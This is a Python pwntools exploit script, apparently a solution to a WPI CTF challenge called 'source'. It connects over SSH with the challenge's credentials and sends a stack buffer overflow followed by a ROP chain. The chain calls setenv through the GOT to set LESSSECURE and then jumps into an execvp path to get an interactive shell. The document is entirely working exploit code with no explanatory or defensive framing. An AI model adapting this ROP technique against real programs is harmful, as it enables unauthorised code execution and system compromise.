from pwn import *
# context.log_level = 'debug'
TARGET = './source'
HOST = 'source.wpictf.xyz'
PORT = 31337
USER = 'source'
PASS = 'sourcelocker'


# r = process(TARGET)
# r = remote(HOST, PORT)
r = ssh(USER, HOST, PORT, PASS)
r = r.run('')

elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

pop_rdi = 0x400843
pop_rsi_r15 = 0x400841
pop_r12_r13_r14_r15 = 0x40083c
special = 0x00400820 # rdx = r15(1), rsi = r14(addr of "NULL"), edi = r13d(addr of "LESSSECURE", call r12(got['setenv']

r.recvuntil('5513/')

payload = ''
payload += 'A' * 112
payload += p64(1)
payload += p64(pop_r12_r13_r14_r15)
payload += p64(elf.got['setenv']) # r12: setenv
payload += p64(0x400883) # r13: ptr "LESSSECURE"
payload += p64(0x6010a0) # r14: ptr "NULL"
payload += p64(1) # "1"
payload += p64(special)
payload += 'A'*56
payload += p64(0x4007b4) # go exevp
r.sendline(payload)

r.interactive()
r.close()
